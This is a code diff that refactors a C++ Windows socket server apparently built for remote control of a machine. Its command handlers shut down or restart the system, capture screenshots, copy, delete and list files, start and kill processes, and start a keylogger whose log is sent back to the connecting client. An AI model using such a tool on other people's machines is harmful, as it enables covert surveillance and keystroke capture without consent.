@@ -3,11 +3,13 @@
 std::unordered_map<std::string, MessageType> ServerSocket::messageMap;
 
 ServerSocket::ServerSocket() : 
-    winAPI(new WinAPI()), 
     keyloggerFilePath("./output-server/default_log.txt"),
     keylogger(new Keylogger()),
     keyboardDisabler(new KeyboardDisabler()),
-    recorder(new VideoRecorder())
+    recorder(new VideoRecorder()),
+    fileOperations(new FileOperations()),
+    processOperations(new ProcessOperations()),
+    systemOperations(new SystemOperations())
 {
 
     WSADATA wsaSATA;
@@ -78,10 +80,12 @@ ServerSocket::~ServerSocket()
 {
     closesocket(serverSocket);
     WSACleanup();
-    delete winAPI;
     delete keylogger;
     delete keyboardDisabler;
     delete recorder;
+    delete fileOperations;
+    delete processOperations;
+    delete systemOperations;
 }
 
 MessageType ServerSocket::hashMessage(const std::string message) {
@@ -117,13 +121,13 @@ void ServerSocket::sendMessage(SOCKET &clientSocket, const char *message)
 void ServerSocket::initializeHandlers() {
     handlers[SHUTDOWN] = [this](SOCKET &clientSocket, const std::string& command) { 
         sendResponse(clientSocket, "Trying to shutdown server!\n");
-        winAPI->systemShutdown(); 
+        systemOperations->systemShutdown(); 
     };
 
     handlers[RESTART] = [this](SOCKET &clientSocket, const std::string& command) { 
         sendResponse(clientSocket, "Trying to restart server!\n");
         LPWSTR restartMessage = L"RESTART"; 
-        winAPI->systemRestart(restartMessage); 
+        systemOperations->systemRestart(restartMessage); 
     };
 
     handlers[GET_IP] = [this](SOCKET &clientSocket, const std::string& command) { 
@@ -141,9 +145,9 @@ void ServerSocket::initializeHandlers() {
     };
 
     handlers[CAPTURE_SCREEN] = [this](SOCKET &clientSocket, const std::string& command) {
-        std::string fileName = winAPI->generateName("screenshot", "png");
+        std::string fileName = MyUtility::generateName("screenshot", "png");
         std::string filePath = "./output-server/" + fileName;
-        std::string result = winAPI->saveScreenshot(filePath);
+        std::string result = systemOperations->saveScreenshot(filePath);
         if (result.substr(0, 6) != "Failed") {
             sendResponse(clientSocket, result);
             sendFile(clientSocket, filePath);
@@ -162,7 +166,7 @@ void ServerSocket::initializeHandlers() {
 
         const std::wstring source = std::wstring(tokens[1].begin(), tokens[1].end());
         const std::wstring destination = std::wstring(tokens[2].begin(), tokens[2].end());
-        std::string result = winAPI->copyFile(source.c_str(), destination.c_str());
+        std::string result = fileOperations->copyFile(source.c_str(), destination.c_str());
         sendResponse(clientSocket, (result.substr(0, 6) != "Failed") ? result : "Error: " + result);
     };
 
@@ -174,7 +178,7 @@ void ServerSocket::initializeHandlers() {
         }
 
         const std::wstring source = std::wstring(tokens[1].begin(), tokens[1].end());
-        std::string result = winAPI->deleteFile(source.c_str());
+        std::string result = fileOperations->deleteFile(source.c_str());
         sendResponse(clientSocket, (result.substr(0, 6) != "Failed") ? result : "Error: " + result);
     };
 
@@ -186,7 +190,7 @@ void ServerSocket::initializeHandlers() {
         }
 
         const std::wstring folderPath = std::wstring(tokens[1].begin(), tokens[1].end());
-        std::string result = winAPI->createFolder(folderPath.c_str());
+        std::string result = fileOperations->createFolder(folderPath.c_str());
         sendResponse(clientSocket, (result.substr(0, 6) != "Failed") ? result : "Error: " + result);
     };
 
@@ -199,7 +203,7 @@ void ServerSocket::initializeHandlers() {
 
         const std::wstring sourceFolder = std::wstring(tokens[1].begin(), tokens[1].end());
         const std::wstring destinationFolder = std::wstring(tokens[2].begin(), tokens[2].end());
-        std::string result = winAPI->copyFolder(sourceFolder.c_str(), destinationFolder.c_str());
+        std::string result = fileOperations->copyFolder(sourceFolder.c_str(), destinationFolder.c_str());
         sendResponse(clientSocket, (result.substr(0, 6) != "Failed") ? result : "Error: " + result);
     };
     
@@ -214,7 +218,7 @@ void ServerSocket::initializeHandlers() {
     };
 
     handlers[LIST_PROCESS] = [this](SOCKET &clientSocket, const std::string& command) {
-        std::string fileName = winAPI->generateName("process_list", "txt");
+        std::string fileName = MyUtility::generateName("process_list", "txt");
         std::string filePath = "./output-server/" + fileName;
         std::string systemCommand = "tasklist > " + filePath;
         int result = system(systemCommand.c_str());
@@ -228,7 +232,7 @@ void ServerSocket::initializeHandlers() {
     };
 
     handlers[LIST_SERVICES] = [this](SOCKET &clientSocket, const std::string& command) {
-        std::string fileName = winAPI->generateName("services_list", "txt");
+        std::string fileName = MyUtility::generateName("services_list", "txt");
         std::string filePath = "./output-server/" + fileName;
         std::string systemCommand = "net start > " + filePath;
         int result = system(systemCommand.c_str());
@@ -246,7 +250,7 @@ void ServerSocket::initializeHandlers() {
         }
 
         std::wstring applicationPath = std::wstring(command.begin() + command.find(' ') + 1, command.end());
-        std::string result = winAPI->StartApplication(applicationPath);
+        std::string result = processOperations->StartApplication(applicationPath);
         sendResponse(clientSocket, result);
     };
 
@@ -258,14 +262,14 @@ void ServerSocket::initializeHandlers() {
         }
 
         DWORD processID = std::stoul(tokens[1]);
-        std::string result = winAPI->TerminateProcessByID(processID);
+        std::string result = processOperations->TerminateProcessByID(processID);
         sendResponse(clientSocket, result);
     };
 
     handlers[LIST_INSTALLED_APP] = [this](SOCKET &clientSocket, const std::string& command) {
-        std::string fileName = winAPI->generateName("installed_app_list", "txt");
+        std::string fileName = MyUtility::generateName("installed_app_list", "txt");
         std::string filePath = "./output-server/" + fileName;
-        std::string result = winAPI->listInstalledApp(filePath);
+        std::string result = processOperations->listInstalledApp(filePath);
         if (result.substr(0, 6) != "Failed") {
             sendResponse(clientSocket, result);
             sendFile(clientSocket, filePath);
@@ -276,9 +280,9 @@ void ServerSocket::initializeHandlers() {
     };
 
     handlers[LIST_RUNNING_APP] = [this](SOCKET &clientSocket, const std::string &command) {
-        std::string fileName = winAPI->generateName("running_app_list", "txt");
+        std::string fileName = MyUtility::generateName("running_app_list", "txt");
         std::string filePath = "./output-server/" + fileName;
-        std::string result = winAPI->listRunningApp(filePath);
+        std::string result = processOperations->listRunningApp(filePath);
         if (result.substr(0, 6) != "Failed") {
             sendResponse(clientSocket, result);
             sendFile(clientSocket, filePath);
@@ -295,9 +299,9 @@ void ServerSocket::initializeHandlers() {
             return;
         }
         const std::wstring directoryPath = std::wstring(command.begin() + command.find(' ') + 1, command.end());
-        std::string fileName = winAPI->generateName("file_list", "txt");
+        std::string fileName = MyUtility::generateName("file_list", "txt");
         std::string filePath = "./output-server/" + fileName;
-        std::string result = winAPI->listFilesInDirectory(directoryPath, filePath);
+        std::string result = fileOperations->listFilesInDirectory(directoryPath, filePath);
         if (result.substr(0, 6) != "Failed") {
             sendResponse(clientSocket, result);
             sendFile(clientSocket, filePath);
@@ -318,7 +322,7 @@ void ServerSocket::initializeHandlers() {
     };
 
     handlers[ENABLE_KEYLOGGER] = [this](SOCKET &clientSocket, const std::string& command) {        
-        std::string fileName = winAPI->generateName("keylogger", "txt");
+        std::string fileName = MyUtility::generateName("keylogger", "txt");
         keyloggerFilePath = "./output-server/" + fileName;
         
         keylogger->start(keyloggerFilePath);
@@ -328,7 +332,7 @@ void ServerSocket::initializeHandlers() {
 
     handlers[DISABLE_KEYLOGGER] = [this](SOCKET &clientSocket, const std::string& command) {
         keylogger->stop();
-        sendResponse(clientSocket, "Keylogger stopped.");
+        sendResponse(clientSocket, "Keylogger stopped. New file at " + keyloggerFilePath);
 
         sendFile(clientSocket, keyloggerFilePath);
     };
